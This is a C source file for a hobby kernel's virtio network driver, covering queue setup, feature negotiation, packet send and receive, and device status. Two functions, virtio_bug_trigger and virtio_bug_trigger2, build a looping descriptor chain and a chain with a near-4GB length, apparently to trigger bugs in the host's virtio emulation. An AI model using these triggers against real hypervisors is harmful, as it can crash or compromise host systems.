/*
 * virtio.c
 * Copyright (C) 2021 mac <hzshang15@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */
#include <virtio.h>
#include <pci.h>
#include <physical_page.h>
#include <libcc.h>
#include <picirq.h>
#include <x86.h>
#include <kprintf.h>
#include <virtio_pci.h>
#include <virtio_net.h>
#include <virtio_ops.h>
#define QUEUE_LENGTH 0x10
#define VIRTIO_BLK_F_SIZE_MAX 1
#define VIRTIO_BLK_F_SEG_MAX 2
#define VIRTIO_BLK_F_GEOMETRY 4
#define VIRTIO_BLK_F_RO 5
#define VIRTIO_BLK_F_BLK_SIZE 6
#define VIRTIO_BLK_F_FLUSH 9
#define VIRTIO_BLK_F_TOPOLOGY 10
#define VIRTIO_BLK_F_CONFIG_WCE 11
#define VIRTIO_BLK_T_IN           0
#define VIRTIO_BLK_T_OUT          1
#define VIRTIO_BLK_T_FLUSH        4
#define VIRTIO_BLK_S_OK        0
#define VIRTIO_BLK_S_IOERR     1
#define VIRTIO_BLK_S_UNSUPP    2


#define DEVICE_STATUS 0x12
#define DEVICE_FEATURE 0
#define DRIVER_FEATURE 4
#define QUEUE_SELECT 0xe
#define QUEUE_SIZE 0xc
#define QUEUE_ADDR 0x8
#define QUEUE_NOTIFY 0x10
virtio_device vdevs[0x10];
/*
 * 0: Device Features bits 0:31
 * 4: Driver Features bits 0:31
 * 8: Queue Address
 * 12: queue_size
 * 14: queue_select
 * 16: Queue Notify
 * 18: Device Status
 * 19: ISR Status
 */
#define FRAME_SIZE 1526
bool virtio_queue_init(virt_queue* queue,uint16_t port,uint16_t idx){
    outw(port + QUEUE_SELECT,idx);
    uint16_t queue_size = inw(port+QUEUE_SIZE);
    memset(queue,0,sizeof(*queue));
    if(!queue_size || queue_size == 0xffff){
        return false;
    }
    kprintf("queue size[%d]: %x\n",idx,queue_size);
    uint32_t buffers_size = sizeof(virtq_desc)*queue_size;
    uint32_t available_size = (2 + queue_size )* sizeof(uint16_t);
    uint32_t used_size = sizeof(virtq_ring)*queue_size + 2*sizeof(uint16_t);
    uint32_t page_count = PAGE_COUNT(buffers_size+available_size) + PAGE_COUNT(used_size);
    uint8_t* buf = physical_alloc(page_count<<12);

    memset(buf,0,page_count<<12);
    kprintf("queue buffer addr: %x\n",buf);

    queue->base_addr = buf;
    queue->available = (virtq_avail*)&buf[buffers_size];
    queue->used = (virtq_used*)PAGE_ALIGN(&buf[buffers_size + available_size]);
    outl(port + QUEUE_ADDR,((uint32_t)buf)>>12);
    queue->available->flags = 0;
    queue->inuse = 1;
    queue->queue_size = queue_size;
    return true;
}

void setup_virtqueue(virtio_device* vdev,int idx);
virtio_device* alloc_virtdev(Device* dev);
void notify_queue(virtio_device* vdev, uint16_t queue);

void show_device_status(virtio_device* vdev);

int network_card_init(virtio_device* vdev){
    virtio_pci_dev* pdev = &vdev->pdev;
    // reset
    pdev->ops->set_status(pdev,0);

    uint8_t c = VIRTIO_ACKNOWLEDGE;
    pdev->ops->set_status(pdev,c);
    c |= VIRTIO_DRIVER;
    pdev->ops->set_status(&vdev->pdev,c);
    uint64_t device_feature = pdev->ops->get_features(pdev);
    kprintf("device feature: %x\n",device_feature);
    DISABLE_FEATURE(device_feature,VIRTIO_CTRL_VQ);
    DISABLE_FEATURE(device_feature,VIRTIO_GUEST_TSO4);
    DISABLE_FEATURE(device_feature,VIRTIO_GUEST_TSO6);
    DISABLE_FEATURE(device_feature,VIRTIO_GUEST_UFO);
    DISABLE_FEATURE(device_feature,VIRTIO_EVENT_IDX);
    DISABLE_FEATURE(device_feature,VIRTIO_MRG_RXBUF);
    DISABLE_FEATURE(device_feature,VIRTIO_F_NOTIFICATION_DATA);
    pdev->ops->set_features(pdev,device_feature);
    pdev->guest_feature = device_feature;
    c |= VIRTIO_FEATURES_OK;
    pdev->ops->set_status(pdev,c);

    uint8_t virtio_status = pdev->ops->get_status(pdev);
    if((virtio_status&VIRTIO_FEATURES_OK) == 0){
        kprintf("feature is not ok\n");
        return 0;
    }
    for(int i=0;i<QUEUE_COUNT;i++){
        setup_virtqueue(vdev,i);
    }
    c |= VIRTIO_DRIVER_OK;
    pdev->ops->set_status(pdev,c);
    virtio_status = pdev->ops->get_status(pdev);
    if (virtio_status & VIRTIO_FAILED){
        kprintf("virtio init failed\n");
        return 0;
    }
    show_device_status(vdev);
    return 1;
}

void network_card_setup(virtio_device* vdev){

    virt_queue* rx = &vdev->queue[0]; // Receive
    virt_queue* tx = &vdev->queue[1]; // Send
    rx->chunk_size = FRAME_SIZE;
    rx->available->index = 0;

    virtq_desc buffer;
    buffer.length = FRAME_SIZE;
    buffer.flags = VIRTIO_DESC_FLAG_WRITE_ONLY;
    buffer.address = 0;
    for(int i=0;i<rx->queue_size;i++){
        virtio_fill_buffer(vdev, 0, &buffer, 1,1);
    }
    tx->available->index = 0;
    tx->chunk_size = FRAME_SIZE;
    vdev->pdev.ops->notify_queue(&vdev->pdev,tx);
    // PCI enable

    void virtionet_handler(struct trapframe* trap);
    virtio_enable_interrupts(rx);

    pic_enable(vdev->pdev.irq,virtionet_handler);
    kprintf("vdev irq: %d\n",vdev->pdev.irq);
}

void virtio_net_install(){
    for(int i=0;i<device_num;i++){
        if(devices[i].vendor == VENDOR
                && devices[i].device == DEVICE
                && devices[i].subsystem_id == 1)
        {
            PCI_loadbars(&devices[i]);
            virtio_device* vdev = alloc_virtdev(&devices[i]);
            if(!network_card_init(vdev) ){
                vdev->inuse = 0;
                continue;
            }
            network_card_setup(vdev);
        }
    }
}

void virtio_enable_interrupts(virt_queue* vq)
{
    vq->used->flags = 0;
}

void virtio_disable_interrupts(virt_queue* vq)
{
    vq->used->flags = 1;
}

virtio_device* alloc_virtdev(Device* dev){
    int i = 0;
    for(;i<sizeof(vdevs)/sizeof(vdevs[0]);i++){
        if(vdevs[i].inuse == 0)
            break;
    }
    if(i == sizeof(vdevs)/sizeof(vdevs[0]))
        return NULL;
    virtio_device* vdev = &vdevs[i];
    memset(vdev,0,sizeof(*vdev));
    vdev->inuse = 1;
    vdev->pdev.pci = dev;
    vdev->pdev.iobase = dev->iobase;
    vdev->pdev.irq = dev->irq;
    // load mac addr
    for(int i=0;i<6;i++){
        vdev->pdev.macaddr[i] = inb(vdev->pdev.iobase+i+0x14);
    }
    kprintf("mac addr: %x:%x:%x:%x:%x:%x\n",
            vdev->pdev.macaddr[0],
            vdev->pdev.macaddr[1],
            vdev->pdev.macaddr[2],
            vdev->pdev.macaddr[3],
            vdev->pdev.macaddr[4],
            vdev->pdev.macaddr[5]);
    // kprintf("virtio dev irq: %d\n",vdev->irq);
    if(virtio_read_caps(&vdev->pdev) == 0){
        // modern mode
        vdev->modern = true;
        vdev->pdev.ops = &modern_ops;

    }else{
        vdev->modern = false;
        vdev->pdev.ops = &legacy_ops;
    }
    return vdev;
}

void setup_virtqueue(virtio_device* vdev,int idx){

    uint16_t queue_size = vdev->pdev.ops->get_queue_num(&vdev->pdev,idx);
    virt_queue* queue = &vdev->queue[idx];
    memset(queue,0,sizeof(*queue));
    if(!queue_size || queue_size == 0xffff){
        return;
    }
    queue->queue_size = queue_size;

    uint32_t buffers_size = sizeof(virtq_desc)*queue_size;
    uint32_t available_size = (2 + queue_size )* sizeof(uint16_t);
    uint32_t used_size = sizeof(virtq_ring)*queue_size + 2*sizeof(uint16_t);
    uint32_t page_count = PAGE_COUNT(buffers_size+available_size) + PAGE_COUNT(used_size);
    uint8_t* buf = physical_alloc(page_count<<12);
    memset(buf,0,page_count<<12);
    queue->base_addr = buf;
    queue->available = (virtq_avail*)&buf[buffers_size];
    queue->used = (virtq_used*)PAGE_ALIGN(&buf[buffers_size + available_size]);
    queue->idx = idx;
    vdev->pdev.ops->setup_queue(&vdev->pdev,queue);
    queue->available->flags = 0;
    kprintf(
        "queue [%d] size: %x\n"
        " desc addr:  %x available addr: %x used addr: %x\n"
        " notify addr: %x\n"
        ,idx,queue_size,queue->base_addr,queue->available,queue->used,
        queue->notify_addr
        );
    return;
}


void virtio_fill_buffer(virtio_device* vdev, uint16_t queue, virtq_desc* desc_chain, uint32_t count,uint32_t copy){
    virt_queue* vq = &vdev->queue[queue];
    uint16_t idx = vq->available->index % vq->queue_size;
    uint16_t buf_idx = vq->next_buffer;
    uint16_t next_buf;
    uint8_t* buf = (uint8_t *)(&vq->arena[vq->chunk_size * buf_idx]);
    vq->available->ring[idx] = buf_idx;
    for(int i=0;i<count;i++){
        next_buf = (buf_idx + 1) % vq->queue_size;
        vq->buffers[buf_idx].flags = desc_chain[i].flags;
        if (i != count -1) {
            vq->buffers[buf_idx].flags |= VIRTIO_DESC_FLAG_NEXT;
        }
        vq->buffers[buf_idx].next = next_buf;
        vq->buffers[buf_idx].length = desc_chain[i].length;
        if(copy){
            vq->buffers[buf_idx].address = (uint64_t)(uint32_t)buf;
            memcpy(buf, (const void*)(uint32_t)desc_chain[i].address, desc_chain[i].length);
            buf += desc_chain[i].length;
        }else{
            vq->buffers[buf_idx].address = (uint64_t)(uint32_t)desc_chain[i].address;
        }
        buf_idx = next_buf;
    }
    vq->next_buffer = next_buf;
    vq->available->index++;
    vdev->pdev.ops->notify_queue(&vdev->pdev,vq);
}

void virtio_bug_trigger(virtio_device* vdev,int queue){
    virt_queue* vq = &vdev->queue[queue];
    uint16_t idx = vq->available->index % vq->queue_size;
    uint16_t buf_idx = vq->next_buffer;

    uint8_t* buf = (uint8_t *)(&vq->arena[vq->chunk_size * buf_idx]);
    vq->available->ring[idx] = buf_idx;
    uint16_t next_buf = (buf_idx + 1) % vq->queue_size;

    memset(buf,'a',0x100);
    vq->buffers[buf_idx].flags = VIRTIO_DESC_FLAG_NEXT;
    vq->buffers[buf_idx].next = next_buf;
    vq->buffers[buf_idx].length = 0x100;
    vq->buffers[buf_idx].address = (uint64_t)(uint32_t)buf;

    vq->buffers[next_buf].flags = VIRTIO_DESC_FLAG_NEXT;
    vq->buffers[next_buf].next = buf_idx;
    vq->buffers[next_buf].length = 0x100;
    vq->buffers[next_buf].address = (uint64_t)(uint32_t)buf;

    vq->available->index++;
    vdev->pdev.ops->notify_queue(&vdev->pdev,vq);
}
char data[0x30a];
void virtio_bug_trigger2(virtio_device* vdev){
    virtq_desc desc[3];

    memset(data,'\xff',sizeof(data));
    desc[0].flags = 0;
    desc[0].address = (uint64_t)(uint32_t)data;
    desc[0].length = sizeof(data);

    desc[1].flags = 0;
    desc[1].address = (uint64_t)(uint32_t)data;
    desc[1].length = 0x100;

    desc[2].flags = 0;
    desc[2].address = (uint64_t)(uint32_t)data;
    desc[2].length = 0xfffffeff;
    kprintf("data addr: %x\n",data);
    virtio_fill_buffer(vdev,1,desc,3,0);

}

void virtionet_send(void* driver, void *packet, uint16_t length){
    virtio_device* vdev = (virtio_device*)driver;
    uint32_t virt_size = length + sizeof(virtio_net_hdr);
    virtq_desc desc[2];
    virtio_net_hdr net;
    memset(&net,0,sizeof(net));
    net.flags = VIRTIO_NET_HDR_F_NEEDS_CSUM;
    net.gso_type = VIRTIO_NET_HDR_GSO_NONE;
    net.csum_start = 0;
    net.csum_offset = virt_size;
    desc[0].flags = 0;
    desc[0].address = (uint32_t)&net;
    desc[0].length = sizeof(virtio_net_hdr);

    desc[1].flags = 0;
    desc[1].address = (uint64_t)(uint32_t)packet;
    desc[1].length = length;
    virtio_fill_buffer(vdev,1,desc,2,1);
}

void virtionet_handler(struct trapframe* trap){
    kprintf("read to recv packet\n");
    virtio_device* vdev = &vdevs[0];
    virt_queue* vq = &vdev->queue[0];
    virtio_disable_interrupts(vq);
    uint8_t isr = vdev->pdev.ops->get_isr(&vdev->pdev);
    kprintf("isr status: %d\n",isr);

    uint16_t idx = vq->last_used_index%vq->queue_size;
    uint16_t buf_idx = vq->used->ring[idx].index;
    kprintf("buffer index: %d length: %d\n",buf_idx,vq->used->ring[idx].length);

    while(1){
        uint32_t addr = vq->buffers[buf_idx].address&0xffffffff;
        uint32_t length = vq->buffers[buf_idx].length;
        kprintf("recv data at addr:%x, length: %d\n",addr,length);
        dumpmem((void*)addr,0x50);
        if(vq->buffers[buf_idx].flags & VIRTIO_DESC_FLAG_NEXT){
            buf_idx = vq->buffers[buf_idx].next;
        }else{
            break;
        }
    }
    vq->last_used_index++;
    virtq_desc buffer;
    buffer.length = FRAME_SIZE;
    buffer.flags = VIRTIO_DESC_FLAG_WRITE_ONLY;
    buffer.address = 0;
    virtio_enable_interrupts(vq);
    virtio_fill_buffer(vdev, 0, &buffer, 1,1);
    return;
}

void show_device_status(virtio_device* vdev){

    uint16_t status = vdev->pdev.ops->get_status(&vdev->pdev);
    kprintf("device status: ");
    if(status & VIRTIO_FAILED){
        kprintf("VIRTIO_FAILED");
    }
    if(status & VIRTIO_ACKNOWLEDGE){
        kprintf("VIRTIO_ACKNOWLEDGE ");
    }
    if(status & VIRTIO_DRIVER){
        kprintf("VIRTIO_DRIVER ");
    }
    if(status & VIRTIO_DRIVER_OK){
        kprintf("VIRTIO_DRIVER_OK ");
    }
    if(status & VIRTIO_FEATURES_OK){
        kprintf("VIRTIO_FEATURES_OK ");
    }
    if(status & VIRTIO_DEVICE_NEEDS_RESET){
        kprintf("VIRTIO_DEVICE_NEEDS_RESET ");
    }
    kprintf("\n");
}

